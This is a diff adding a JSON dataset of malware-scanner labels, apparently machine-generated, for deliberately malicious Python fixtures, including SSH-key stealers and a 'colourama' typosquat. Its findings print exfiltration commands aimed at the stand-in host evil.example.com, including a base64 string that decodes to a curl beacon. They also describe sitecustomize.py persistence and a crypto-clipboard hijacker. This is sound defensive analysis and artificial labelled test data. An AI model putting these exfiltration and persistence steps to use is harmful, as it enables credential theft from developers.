@@ -1,0 +1,3217 @@
+[
+  {
+    "file_hash": "75efce4bb9fe7fb970bbf9437916cf5d02de5e067555fd8542da6b2bbaada3c8",
+    "file_name": "01_litellm_obfuscated.py",
+    "classification": "malicious",
+    "stratum_assigned": "obfuscation_exec_chain",
+    "full_label": {
+      "triage": {
+        "file_type": "script",
+        "language": "python",
+        "framework": null,
+        "ecosystem": "pypi",
+        "is_ai_component": false,
+        "priority_score": 5,
+        "scan_depth": "full",
+        "pass2_candidate": true,
+        "pass2_reason": "obfuscated_payload"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "evil.example.com",
+              "context": "c2_suspect"
+            }
+          ],
+          "urls": [
+            {
+              "value": "https://evil.example.com/exfil",
+              "context": "C2 exfiltration endpoint"
+            },
+            {
+              "value": "https://evil.example.com/ping",
+              "context": "C2 beacon endpoint"
+            }
+          ],
+          "cloud_resources": [],
+          "file_paths_referenced": [
+            {
+              "path": "~/.ssh",
+              "operation": "list",
+              "sensitivity": "critical",
+              "description": "User SSH directory enumeration"
+            },
+            {
+              "path": "~/.ssh/*",
+              "operation": "read",
+              "sensitivity": "critical",
+              "description": "Read SSH private keys and config"
+            }
+          ],
+          "other_indicators": []
+        },
+        "capabilities": {
+          "tags": [
+            "network_outbound",
+            "file_read",
+            "process_spawn",
+            "env_access",
+            "dynamic_execution",
+            "credential_access",
+            "data_collection",
+            "data_encoding",
+            "data_exfiltration",
+            "c2_communication",
+            "defense_evasion"
+          ],
+          "dangerous_apis": [
+            "exec",
+            "base64.b64decode",
+            "subprocess.Popen",
+            "subprocess.run",
+            "os.listdir",
+            "open"
+          ],
+          "network_calls": [
+            {
+              "destination": "https://evil.example.com/exfil",
+              "method": "POST",
+              "purpose": "Exfiltrate SSH private keys and user environment data to attacker C2",
+              "declared": false
+            },
+            {
+              "destination": "https://evil.example.com/ping",
+              "method": "GET",
+              "purpose": "Beacon/ping to attacker C2 via curl",
+              "declared": false
+            }
+          ],
+          "commands_executed": [
+            {
+              "command": "curl -X POST -d <json> https://evil.example.com/exfil",
+              "method": "subprocess.run",
+              "purpose": "POST stolen SSH keys and env data to C2"
+            },
+            {
+              "command": "curl https://evil.example.com/ping",
+              "method": "subprocess.Popen (base64-decoded)",
+              "purpose": "Beacon to C2"
+            }
+          ],
+          "env_vars_accessed": [
+            {
+              "name": "USER",
+              "sensitivity": "low",
+              "risk_category": "infrastructure"
+            },
+            {
+              "name": "HOME",
+              "sensitivity": "low",
+              "risk_category": "infrastructure"
+            }
+          ],
+          "crypto_operations": [],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": false
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "base64",
+            "exec_chain"
+          ],
+          "layers": 1,
+          "suspicion_score": 1.0,
+          "decoded_content_summary": "Payload enumerates ~/.ssh, reads every file's contents including private keys, bundles with USER/HOME env vars as JSON, and POSTs to https://evil.example.com/exfil via curl. Second base64 blob invokes curl to https://evil.example.com/ping."
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "malware_behavior",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "SSH private key exfiltration to attacker-controlled C2",
+            "cwe": "CWE-522",
+            "cvss_estimate": 9.8,
+            "code_snippet": {
+              "description": "Decoded SSH key exfiltration routine",
+              "lines": [
+                1,
+                30
+              ]
+            },
+            "explanation": "Decoded payload enumerates ~/.ssh, reads every file (including id_rsa, id_ed25519, config, known_hosts) and POSTs the contents plus USER/HOME env vars as JSON to https://evil.example.com/exfil via curl. This is credential theft of SSH keys, enabling lateral movement and long-term account takeover.",
+            "data_flow": "~/.ssh/* (filesystem) -> open().read() -> json.dumps(data) -> subprocess.run(curl -X POST ...) -> https://evil.example.com/exfil",
+            "fix": "Delete this file immediately. Treat the host as compromised: rotate all SSH keys present under ~/.ssh, revoke authorized_keys entries on remote systems, audit sudo/bash history, and scan for persistence. Block evil.example.com at the network egress.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1552.004",
+              "T1041",
+              "T1059.006"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "malware_behavior",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Dynamic execution of base64-decoded payload (exec + b64decode)",
+            "cwe": "CWE-506",
+            "cvss_estimate": 9.3,
+            "code_snippet": null,
+            "explanation": "The script calls exec(base64.b64decode(_PAYLOAD)) to run a hidden payload, and launches subprocess.Popen(base64.b64decode(...)) to invoke curl. Obfuscating code behind base64 + exec is a classic defense-evasion technique used to bypass static scanners, and is by itself a strong malware indicator.",
+            "data_flow": null,
+            "fix": "Do not execute. Remove the file. Audit any source that delivered it (package postinstall, supply chain dependency, or pasted snippet).",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.006"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F003",
+            "type": "data_exfiltration",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Outbound C2 beaconing to evil.example.com",
+            "cwe": null,
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "Two distinct outbound calls are made to evil.example.com: a POST /exfil carrying stolen SSH keys, and a curl https://evil.example.com/ping beacon. The destination is not declared anywhere in the file and has no legitimate purpose.",
+            "data_flow": null,
+            "fix": "Block evil.example.com at perimeter. Hunt for other hosts that have contacted it. Check for any cached credentials that may already have been stolen.",
+            "proof_of_concept": null,
+            "mitre_attack": [],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F004",
+            "type": "supply_chain_risk",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "File masquerades as LiteLLM integration (typosquat / trojan)",
+            "cwe": null,
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "Filename suggests a LiteLLM-related utility but the file contains no LiteLLM logic. It is purely an obfuscated credential stealer, consistent with typosquatting or trojanized dependency attacks targeting developers who install AI/LLM packages.",
+            "data_flow": null,
+            "fix": "Remove from any dependency manifests. Report the package/source to the registry. Pin dependencies by hash.",
+            "proof_of_concept": null,
+            "mitre_attack": [],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Presents as a LiteLLM-related Python script but is an obfuscated credential stealer that reads SSH private keys and exfiltrates them to an attacker-controlled C2, plus a secondary C2 beacon.",
+          "risk_narrative": "This file is overtly malicious. It uses base64+exec to hide a payload that enumerates ~/.ssh, reads every file, bundles the contents with environment info, and POSTs them to evil.example.com. A second base64 blob runs curl to a ping endpoint. Execution on any developer workstation would result in immediate compromise of SSH credentials and likely lateral movement. Treat any host that ran this as compromised.",
+          "sensitivity": "critical",
+          "data_types": [
+            "ssh_private_keys",
+            "ssh_config",
+            "username",
+            "home_directory_path"
+          ],
+          "data_flows": [
+            {
+              "source": "~/.ssh/ filesystem",
+              "sink": "https://evil.example.com/exfil",
+              "risk": "Complete theft of user's SSH private keys and known_hosts, enabling impersonation and lateral movement across all hosts the user has SSH access to.",
+              "transforms": [
+                "open().read()",
+                "json.dumps",
+                "curl -X POST"
+              ]
+            },
+            {
+              "source": "os.environ (USER, HOME)",
+              "sink": "https://evil.example.com/exfil",
+              "risk": "Leaks user identity and home path to attacker for targeting.",
+              "transforms": [
+                "json.dumps",
+                "curl POST"
+              ]
+            }
+          ],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "filename 01_litellm_obfuscated.py implies LiteLLM integration",
+            "mismatch_severity": "critical",
+            "description": "Filename suggests LiteLLM-related functionality but file contains zero LiteLLM code; it is a pure credential stealer.",
+            "undeclared_capabilities": [
+              "SSH key read",
+              "outbound HTTP to evil.example.com",
+              "base64+exec dynamic execution",
+              "subprocess curl"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [
+              "https://evil.example.com/exfil",
+              "https://evil.example.com/ping"
+            ],
+            "encoding_before_sending": "json.dumps of dict containing SSH key contents; command itself hidden via base64+exec",
+            "data_in_logs": null,
+            "data_in_errors": null
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [
+              "_PAYLOAD (base64 body of phone_home)",
+              "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vcGluZw== => curl https://evil.example.com/ping"
+            ],
+            "dynamic_url_construction": false,
+            "conditional_behavior": null,
+            "comment_code_mismatch": "Top comment says 'decode and execute the hidden payload' \u2014 unusually honest but deliberate obfuscation",
+            "hidden_instructions": "Full exfiltration routine hidden inside base64 _PAYLOAD decoded by exec()",
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "Obfuscated SSH key theft and C2 exfiltration",
+            "likelihood": "confirmed",
+            "entry_point": "Execution of 01_litellm_obfuscated.py (e.g., python 01_litellm_obfuscated.py or via a package postinstall/import)",
+            "impact": "Full compromise of user's SSH identity; attacker gains persistent access to every host/service the user can SSH into, plus ability to push code as the user.",
+            "steps": [
+              "Developer executes the file (directly or via import).",
+              "exec(base64.b64decode(_PAYLOAD)) runs hidden phone_home().",
+              "phone_home enumerates ~/.ssh and reads every file's contents.",
+              "SSH keys + USER/HOME bundled as JSON.",
+              "curl POSTs JSON to https://evil.example.com/exfil.",
+              "Second base64 blob runs curl https://evil.example.com/ping as a beacon/confirmation."
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.006",
+              "T1552.004",
+              "T1041"
+            ],
+            "findings_used": [
+              "F001",
+              "F002",
+              "F003",
+              "F004"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "exploitability_test",
+            "description": "Confirm the decoded payload reads ~/.ssh contents and emits an outbound POST containing them to evil.example.com/exfil.",
+            "test_approach": "Run the script in a sandbox with a fake HOME containing ~/.ssh/id_rsa placeholder files and a mock HTTPS server capturing requests. Assert the mock server receives a POST whose body contains the placeholder key contents.",
+            "suggested_payload": "Seed ~/.ssh/id_rsa with a unique canary string; verify canary appears in captured POST body.",
+            "environment_needs": [
+              "isolated network with DNS override for evil.example.com",
+              "mock HTTPS endpoint",
+              "fake ~/.ssh directory"
+            ],
+            "oracle_type": "mock_server",
+            "estimated_complexity": "low",
+            "poc_feasible": true,
+            "test_steps": [
+              {
+                "step_number": 1,
+                "action": "Set HOME=/tmp/victim; create /tmp/victim/.ssh/id_rsa with canary token",
+                "expected_state": "Fake SSH dir present",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 2,
+                "action": "Redirect evil.example.com to local mock server",
+                "expected_state": "DNS/hosts override active",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 3,
+                "action": "Run python 01_litellm_obfuscated.py",
+                "expected_state": "Process executes exec(base64) payload",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 4,
+                "action": "Inspect mock server request log",
+                "expected_state": "POST /exfil received containing canary token; GET /ping also observed",
+                "depends_on_step": null
+              }
+            ],
+            "environment_complexity": "multi_process",
+            "estimated_sandbox_time_sec": 30
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "critical_malicious",
+        "log_summary": "Obfuscated credential stealer: base64+exec decodes a routine that reads ~/.ssh and POSTs private keys to evil.example.com, plus a C2 beacon.",
+        "recommended_action": "delete_and_rotate_credentials",
+        "validation_status": "static_only"
+      }
+    },
+    "error": null,
+    "usage": {
+      "input_tokens": 14748,
+      "output_tokens": 4740,
+      "cost_usd": 0.5767
+    },
+    "prompt_shape": "enriched",
+    "preprocessing_summary": {
+      "was_decoded": true,
+      "decode_layers": 1,
+      "obfuscation_detected": true,
+      "techniques": [
+        "exec_chain",
+        "base64"
+      ],
+      "decoded_blob_count": 1,
+      "failed_blob_count": 0,
+      "suspicion_score": 0.8,
+      "merged_len": 1050,
+      "raw_len": 1209,
+      "pre_pass_duration_ms": 0.24
+    },
+    "model": "claude-opus-4-7"
+  },
+  {
+    "file_hash": "8a1c9f013d6f5908f2c75fdd213a670211d64a2cd0ee2f1e3c156f58cd7857d8",
+    "file_name": "03_consistency_variable.py",
+    "classification": "malicious",
+    "stratum_assigned": "obfuscation_variable_binding",
+    "full_label": {
+      "triage": {
+        "file_type": "script",
+        "language": "python",
+        "framework": null,
+        "ecosystem": "pypi",
+        "is_ai_component": false,
+        "priority_score": 5,
+        "scan_depth": "full",
+        "pass2_candidate": true,
+        "pass2_reason": "obfuscated_payload"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "evil.example.com",
+              "context": "c2_suspect"
+            }
+          ],
+          "urls": [
+            {
+              "value": "https://evil.example.com/exfil",
+              "context": "C2 exfiltration endpoint invoked via curl"
+            }
+          ],
+          "cloud_resources": [],
+          "file_paths_referenced": [
+            {
+              "path": "~/.ssh",
+              "operation": "list",
+              "sensitivity": "critical",
+              "description": "Enumerates user SSH directory"
+            },
+            {
+              "path": "~/.ssh/*",
+              "operation": "read",
+              "sensitivity": "critical",
+              "description": "Reads all SSH key files (private keys, known_hosts, config)"
+            }
+          ],
+          "other_indicators": []
+        },
+        "capabilities": {
+          "tags": [
+            "network_outbound",
+            "file_read",
+            "process_spawn",
+            "env_access",
+            "credential_access",
+            "data_collection",
+            "data_exfiltration",
+            "data_encoding",
+            "dynamic_execution",
+            "defense_evasion",
+            "c2_communication"
+          ],
+          "dangerous_apis": [
+            "exec",
+            "base64.b64decode",
+            "subprocess.run",
+            "os.environ.get",
+            "open",
+            "os.listdir"
+          ],
+          "network_calls": [
+            {
+              "destination": "https://evil.example.com/exfil",
+              "method": "POST",
+              "purpose": "Exfiltrate harvested SSH keys and user environment to attacker C2 endpoint",
+              "declared": false
+            }
+          ],
+          "commands_executed": [
+            {
+              "command": "curl -X POST -d <json> https://evil.example.com/exfil",
+              "method": "subprocess.run",
+              "purpose": "POST collected SSH key contents to remote C2"
+            }
+          ],
+          "env_vars_accessed": [
+            {
+              "name": "USER",
+              "sensitivity": "low",
+              "risk_category": "infrastructure"
+            },
+            {
+              "name": "HOME",
+              "sensitivity": "low",
+              "risk_category": "infrastructure"
+            }
+          ],
+          "crypto_operations": [],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": false
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "base64",
+            "exec_chain"
+          ],
+          "layers": 1,
+          "suspicion_score": 0.98,
+          "decoded_content_summary": "Base64 payload decoded via exec(base64.b64decode(...)) reveals phone_home() that reads ~/.ssh contents and POSTs them to https://evil.example.com/exfil via curl subprocess."
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "malware_behavior",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "SSH key exfiltration to attacker-controlled C2 via base64-obfuscated exec",
+            "cwe": "CWE-522",
+            "cvss_estimate": 9.8,
+            "code_snippet": {
+              "description": "exec of base64-decoded payload",
+              "lines": [
+                1,
+                30
+              ]
+            },
+            "explanation": "The script stores a base64-encoded payload in _PAYLOAD and runs exec(base64.b64decode(_PAYLOAD)) at import. The decoded payload enumerates ~/.ssh, reads every file (including private keys), and POSTs the contents as JSON to https://evil.example.com/exfil using a curl subprocess. This is unambiguous credential theft.",
+            "data_flow": "os.environ[HOME] -> ~/.ssh/* file reads -> JSON serialization -> curl POST to https://evil.example.com/exfil",
+            "fix": "Delete this file immediately. Rotate all SSH keys for any account that executed it, invalidate authorized_keys entries derived from those keys, audit shell history and outbound network logs for connections to evil.example.com, and treat the host as compromised.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1552.004",
+              "T1041",
+              "T1059.006",
+              "T1027"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "code_injection",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Dynamic code execution via exec(base64.b64decode(...))",
+            "cwe": "CWE-94",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "The use of exec() on a base64-decoded blob is a classic defense-evasion pattern designed to hide malicious behavior from casual inspection and naive static scanners. Even absent the SSH-exfil payload, this construct alone is a strong malware indicator.",
+            "data_flow": null,
+            "fix": "Never use exec() on decoded blobs. Remove the file; if a legitimate use case existed, replace with explicit, reviewable Python code.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1027",
+              "T1140"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F003",
+            "type": "data_exfiltration",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Outbound POST of sensitive data to hardcoded external domain",
+            "cwe": "CWE-200",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "subprocess.run invokes curl to POST collected JSON (containing SSH key contents) to https://evil.example.com/exfil. The destination is hardcoded, undeclared, and matches no legitimate purpose for this script.",
+            "data_flow": null,
+            "fix": "Block egress to evil.example.com at the network layer, remove the file, and review network telemetry for prior exfiltration events.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1041",
+              "T1071.001"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Disguised as a benign 'consistency fixture', the file decodes and executes a base64 payload that harvests SSH credentials from the invoking user's home directory and exfiltrates them to an external C2 endpoint.",
+          "risk_narrative": "This is staged credential-theft malware. Execution is automatic at import time via a top-level exec() call, requires no user interaction, and uses curl (not the requests library) to bypass Python-level network monitoring. SSH private keys provide lateral-movement capability into any system trusting the victim's keys. The base64 wrapper is a low-effort but effective obfuscation against keyword scanners.",
+          "sensitivity": "critical",
+          "data_types": [
+            "ssh_private_keys",
+            "username",
+            "home_directory_path",
+            "ssh_config"
+          ],
+          "data_flows": [
+            {
+              "source": "~/.ssh/* file contents",
+              "sink": "https://evil.example.com/exfil (HTTP POST via curl)",
+              "risk": "Full disclosure of SSH private keys to attacker-controlled domain enabling lateral movement and persistent access to any system trusting these keys.",
+              "transforms": [
+                "file read",
+                "JSON serialization",
+                "subprocess argv"
+              ]
+            }
+          ],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "Header comment claims 'Consistency fixture 1: encoded payload as variable assignment'",
+            "mismatch_severity": "critical",
+            "description": "The file presents itself as a benign test fixture for scanner consistency evaluation, but its decoded payload performs SSH key theft and C2 exfiltration. If this is genuinely a red-team/research fixture, the malicious behavior must not actually execute; as written, exec() will run it.",
+            "undeclared_capabilities": [
+              "filesystem read of ~/.ssh",
+              "subprocess execution of curl",
+              "outbound network POST to external domain",
+              "credential harvesting"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [
+              "https://evil.example.com/exfil"
+            ],
+            "encoding_before_sending": "JSON-encoded dict containing raw SSH key file contents",
+            "data_in_logs": null,
+            "data_in_errors": null
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [
+              "_PAYLOAD (base64)"
+            ],
+            "dynamic_url_construction": false,
+            "conditional_behavior": null,
+            "comment_code_mismatch": "Comments describe a benign 'consistency fixture' while the code executes credential-stealing payload",
+            "hidden_instructions": "Base64 blob hides SSH exfiltration logic from surface-level inspection",
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "Auto-exec credential theft on import",
+            "likelihood": "confirmed",
+            "entry_point": "Module import / direct execution triggers top-level exec(base64.b64decode(_PAYLOAD))",
+            "impact": "Full disclosure of victim's SSH private keys to attacker, enabling lateral movement to any host trusting those keys.",
+            "steps": [
+              "Victim imports or runs the script",
+              "exec() decodes and runs the embedded payload",
+              "phone_home() reads USER/HOME env vars and enumerates ~/.ssh",
+              "All SSH key file contents are read and serialized to JSON",
+              "curl POSTs the JSON to https://evil.example.com/exfil",
+              "Attacker uses stolen private keys for lateral movement"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1552.004",
+              "T1041",
+              "T1071.001"
+            ],
+            "findings_used": [
+              "F001",
+              "F002",
+              "F003"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "exploitability_test",
+            "description": "Verify that running the script causes an outbound HTTP POST to evil.example.com containing files from a seeded ~/.ssh directory.",
+            "test_approach": "In a sandbox, seed $HOME/.ssh with marker files (e.g., id_rsa containing a unique canary token). Run the script with a mock DNS/HTTP server intercepting evil.example.com. Assert: (1) POST request received at /exfil, (2) request body contains the canary token, (3) curl process was spawned.",
+            "suggested_payload": "Seed ~/.ssh/id_rsa with 'CANARY-TOKEN-<uuid>' and grep intercepted POST body for the token.",
+            "environment_needs": [
+              "sandbox filesystem with seeded ~/.ssh",
+              "DNS override for evil.example.com",
+              "HTTP listener capturing POST bodies",
+              "curl binary available"
+            ],
+            "oracle_type": "mock_server",
+            "estimated_complexity": "low",
+            "poc_feasible": true,
+            "test_steps": [
+              {
+                "step_number": 1,
+                "action": "Create sandbox $HOME/.ssh/id_rsa with canary content",
+                "expected_state": "File exists and is readable",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 2,
+                "action": "Start mock HTTP server bound to evil.example.com:443 with self-signed cert",
+                "expected_state": "Server listening",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 3,
+                "action": "Execute the script under the sandbox",
+                "expected_state": "exec runs payload, curl spawned",
+                "depends_on_step": 2
+              },
+              {
+                "step_number": 4,
+                "action": "Inspect captured POST body for canary token",
+                "expected_state": "Canary token present in JSON body, confirming exfiltration",
+                "depends_on_step": 3
+              }
+            ],
+            "environment_complexity": "multi_process",
+            "estimated_sandbox_time_sec": 30
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "critical_malicious",
+        "log_summary": "Base64-obfuscated exec() payload that reads ~/.ssh contents and POSTs them to evil.example.com via curl. Confirmed credential-theft malware.",
+        "recommended_action": "delete_and_rotate_credentials",
+        "validation_status": "static_only"
+      }
+    },
+    "error": null,
+    "usage": {
+      "input_tokens": 14705,
+      "output_tokens": 4134,
+      "cost_usd": 0.5306
+    },
+    "prompt_shape": "enriched",
+    "preprocessing_summary": {
+      "was_decoded": true,
+      "decode_layers": 1,
+      "obfuscation_detected": true,
+      "techniques": [
+        "exec_chain",
+        "base64"
+      ],
+      "decoded_blob_count": 1,
+      "failed_blob_count": 0,
+      "suspicion_score": 0.8,
+      "merged_len": 1014,
+      "raw_len": 1172,
+      "pre_pass_duration_ms": 0.26
+    },
+    "model": "claude-opus-4-7"
+  },
+  {
+    "file_hash": "3973074ab097f46a21bef9204eb87afc40c89fa26d0b9520e799aeae608f0904",
+    "file_name": "04_colourama_setup.py",
+    "classification": "malicious",
+    "stratum_assigned": "supply_chain_typosquat",
+    "full_label": {
+      "triage": {
+        "file_type": "setup_script",
+        "language": "python",
+        "framework": "setuptools",
+        "ecosystem": "pypi",
+        "is_ai_component": false,
+        "priority_score": 5,
+        "scan_depth": "full",
+        "pass2_candidate": true,
+        "pass2_reason": "obfuscated_payload"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [],
+          "urls": [
+            {
+              "value": "https://github.com/example/colourama",
+              "context": "package_metadata_url_placeholder"
+            }
+          ],
+          "cloud_resources": [],
+          "file_paths_referenced": [
+            {
+              "path": "<install_lib>/sitecustomize.py",
+              "operation": "write",
+              "sensitivity": "critical",
+              "description": "Drops sitecustomize.py into site-packages for persistence on every Python startup."
+            }
+          ],
+          "other_indicators": [
+            {
+              "value": "DEMO_ATTACKER_BTC_ADDRESS_PLACEHOLDER",
+              "indicator_type": "crypto_wallet_placeholder",
+              "context": "Substitution target for BTC clipboard hijack (scrubbed).",
+              "line": null,
+              "severity_hint": null
+            },
+            {
+              "value": "DEMO_ATTACKER_ETH_ADDRESS_PLACEHOLDER",
+              "indicator_type": "crypto_wallet_placeholder",
+              "context": "Substitution target for ETH clipboard hijack (scrubbed).",
+              "line": null,
+              "severity_hint": null
+            }
+          ]
+        },
+        "capabilities": {
+          "tags": [
+            "file_write",
+            "dynamic_execution",
+            "persistence",
+            "data_encoding",
+            "defense_evasion",
+            "credential_access",
+            "data_collection"
+          ],
+          "dangerous_apis": [
+            "base64.b64decode",
+            "exec",
+            "ctypes.windll.user32.OpenClipboard",
+            "ctypes.windll.user32.GetClipboardData",
+            "ctypes.windll.kernel32.GlobalLock",
+            "setuptools.command.install.install (custom cmdclass)"
+          ],
+          "network_calls": [],
+          "commands_executed": [
+            {
+              "command": "exec(base64.b64decode(_SITECUSTOMIZE_PAYLOAD))",
+              "method": "python_exec",
+              "purpose": "Run the decoded clipboard-hijacker payload in the installer process immediately."
+            }
+          ],
+          "env_vars_accessed": [],
+          "crypto_operations": [],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": true
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "base64"
+          ],
+          "layers": 1,
+          "suspicion_score": 0.95,
+          "decoded_content_summary": "Windows-only clipboard polling loop using ctypes user32/kernel32: OpenClipboard + GetClipboardData, regex-matches BTC/ETH wallet addresses, prints a 'would_substitute' line pointing to attacker addresses. Scrubbed: no real write-back or network egress, but structure mirrors the 2018 colourama clipbo"
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "malware_behavior",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Typosquat setup.py drops sitecustomize.py persistence and execs base64 clipboard-hijacker payload on install",
+            "cwe": "CWE-506",
+            "cvss_estimate": null,
+            "code_snippet": {
+              "description": "Base64 decode + sitecustomize drop + exec in installer",
+              "lines": [
+                78,
+                95
+              ]
+            },
+            "explanation": "The custom install cmdclass (_PostInstall) decodes a base64 blob and (a) writes it to site-packages/sitecustomize.py so every Python invocation auto-runs it, and (b) exec()'s it in-process. The decoded payload is a Windows clipboard-polling loop that matches BTC/ETH wallet regexes and would substitute attacker-controlled addresses \u2014 a faithful reproduction of the 2018 colourama PyPI typosquat. Exceptions are swallowed so installs 'never fail'.",
+            "data_flow": "Hardcoded base64 string -> base64.b64decode -> (1) write to install_lib/sitecustomize.py (persistence), (2) exec() in-process; decoded payload reads Windows clipboard and matches crypto-wallet addresses.",
+            "fix": "Do not install this package. Remove any dropped sitecustomize.py from site-packages, audit Python env for other typosquats, and rotate any secrets exposed via the compromised interpreter. Pin dependencies by hash and use an allow-listed package mirror to prevent typosquat installation.",
+            "proof_of_concept": "pip install ./colourama triggers _PostInstall.run() which decodes the payload, writes site-packages/sitecustomize.py, and exec()s the clipboard-monitoring loop. On Windows, subsequent python invocations auto-load sitecustomize.py and poll the clipboard.",
+            "mitre_attack": [
+              "T1195.002",
+              "T1546.016",
+              "T1115",
+              "T1140",
+              "T1059.006"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "malware_behavior",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Clipboard hijacker targeting BTC/ETH wallet addresses",
+            "cwe": "CWE-200",
+            "cvss_estimate": null,
+            "code_snippet": {
+              "description": "Base64 payload (decoded: clipboard poll + regex match)",
+              "lines": [
+                38,
+                66
+              ]
+            },
+            "explanation": "Decoded payload compiles regexes for BTC (^((bc1)|[13])[a-zA-KM-Z0-9]{25,40}$) and ETH (^0x[a-fA-F0-9]{40}$) addresses, continuously polls the Windows clipboard via ctypes user32/kernel32, and \u2014 in the original attack \u2014 substitutes attacker addresses. The scrubbed version still extracts clipboard contents and references attacker-address constants.",
+            "data_flow": null,
+            "fix": "Remove the package and any sitecustomize.py it dropped. Treat the host as compromised: audit recent cryptocurrency transactions initiated from that machine and rotate wallets.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1115",
+              "T1056"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F003",
+            "type": "supply_chain_risk",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Typosquat of 'colorama' package with deceptive metadata",
+            "cwe": "CWE-1357",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "Package name 'colourama' is a deliberate typosquat of the popular 'colorama' package. Docstring and setup() metadata describe innocuous ANSI-color functionality that does not match the installer's actual behavior (drops sitecustomize.py, exec's payload). This is the classic PyPI typosquat supply-chain pattern.",
+            "data_flow": null,
+            "fix": "Block 'colourama' at the package mirror, warn developers off name-similar packages, and prefer hash-pinned installs from a curated index.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1195.002"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F004",
+            "type": "code_injection",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Dynamic exec() of base64-decoded payload during package install",
+            "cwe": "CWE-94",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "_PostInstall.run() calls exec(base64.b64decode(_SITECUSTOMIZE_PAYLOAD)), executing arbitrary bytecode in the installer's process. Combined with setuptools cmdclass, this means any 'pip install' of the package \u2014 even with --no-binary \u2014 immediately runs attacker code with the invoker's privileges.",
+            "data_flow": null,
+            "fix": "Never allow arbitrary code execution in setup.py cmdclass hooks. Use PEP 517/518 wheels, review install hooks, and consider pip install --only-binary and hash pinning.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1059.006",
+              "T1140"
+            ],
+            "known_cve": null,
+            "patch_available": null,
